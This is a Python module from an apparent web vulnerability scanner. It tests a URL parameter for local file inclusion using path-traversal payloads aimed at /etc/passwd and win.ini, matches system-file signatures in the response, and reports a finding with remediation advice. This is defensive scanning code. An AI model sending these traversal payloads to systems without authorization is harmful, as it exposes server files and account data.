from app.engine.modules.base import BaseVulnerability

class LFIModule(BaseVulnerability):
    def __init__(self, session):
        super().__init__(session)
        self.payloads = [
            "../../../../etc/passwd", 
            "../../../../windows/win.ini", 
            "....//....//....//etc/passwd"
        ]
        self.signatures = [
            "root:x:0:0:", 
            "[extensions]", 
            "for 16-bit app support"
        ]

    async def check(self, url, method, param, scan_id):
        for payload in self.payloads:
            try:
                if method == "GET":
                    target_url = f"{url}?{param}={payload}"
                    async with self.session.get(target_url, timeout=5) as resp:
                        text = await resp.text()
                        for sig in self.signatures:
                            if sig in text:
                                self.report(scan_id, "Local File Inclusion (LFI)", "High",
                                            f"{url}",
                                            f"Payload: {payload}\nSignature Match: {sig}",
                                            f"""
                                            <div class='space-y-2'>
                                                <p class='font-bold text-red-400'>Vulnerability Detected: Local File Inclusion (LFI)</p>
                                                <p>The application allows reading arbitrary files on the server via the '<b>{param}</b>' parameter. This was confirmed by retrieving a known system file.</p>
                                                <div class='bg-gray-800 p-2 rounded border border-gray-700 font-mono text-xs'>
                                                    GET {url}?{param}={payload} HTTP/1.1<br>
                                                    <span class='text-red-400'>Response contains: "{sig}"</span>
                                                </div>
                                                <p class='font-bold text-green-400 mt-2'>Remediation:</p>
                                                <ul class='list-disc list-inside text-sm'>
                                                    <li>Avoid passing user input to file system APIs.</li>
                                                    <li>Use an allowlist of permitted filenames.</li>
                                                    <li>Validate input against a strict regex (e.g., alphanumeric only).</li>
                                                </ul>
                                            </div>
                                            """)
                                return
            except:
                pass
